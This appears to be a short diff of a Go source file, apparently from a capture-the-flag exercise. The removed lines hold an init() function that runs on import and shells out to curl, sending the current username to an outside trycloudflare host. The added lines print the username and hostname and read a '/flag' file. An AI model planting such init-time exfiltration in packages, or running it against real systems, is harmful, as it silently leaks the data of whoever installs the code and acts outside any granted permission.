@@ -1,9 +1,16 @@
-package gogeta
-
+package main
 import (
-    "os/exec"
+    "fmt"
+    "os"
+    "os/user"
 )
 
 func init() {
-    exec.Command("sh", "-c", "curl chairs-bd-writer-springfield.trycloudflare.com/?user=$(whoami)").Run()
+    u, _ := user.Current()
+    fmt.Println("USERNAME:", u.Username)
+    h, _ := os.Hostname()
+    fmt.Println("HOST:", h)
+
+    data, _ := os.ReadFile("/flag") // try common flag path
+    fmt.Println("FLAG:", string(data))
 }
